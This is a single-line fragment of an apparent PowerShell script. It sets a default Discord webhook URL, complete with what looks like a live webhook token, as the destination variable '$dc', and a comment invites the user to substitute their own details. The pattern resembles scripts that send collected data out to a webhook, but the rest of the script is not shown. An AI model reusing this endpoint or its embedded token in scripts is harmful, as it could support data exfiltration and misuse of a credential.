...
if ($dc.Length -eq 0){$dc = "https://discord.com/api/webhooks/1463004209887842591/HinWkocRQFwrwk0j8MKR4V9sDKi0tpgKbBhILTJHh5AdG6kqH5Sya2DcJho9awfcaZji"} # Change this to open GUI with your details
